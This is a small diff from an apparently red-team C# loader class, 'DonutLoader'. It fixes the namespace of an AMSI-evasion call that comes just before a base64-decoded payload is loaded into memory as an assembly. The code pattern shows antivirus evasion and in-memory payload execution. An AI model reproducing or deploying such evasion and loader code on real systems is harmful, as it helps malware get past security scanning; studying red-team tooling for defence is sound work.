@@ -13,7 +13,7 @@ class DonutLoader
 
     static void Main(string[] args)
     {
-        RedPeanutAgent.Evasion.Evade(amsievasion);
+        RedPeanutAgent.Evasion.Evasion.Evade(amsievasion);
 
         System.Reflection.Assembly a = System.Reflection.Assembly.Load(getPayload(payload64));
         Type assemblyType = a.GetType(type);
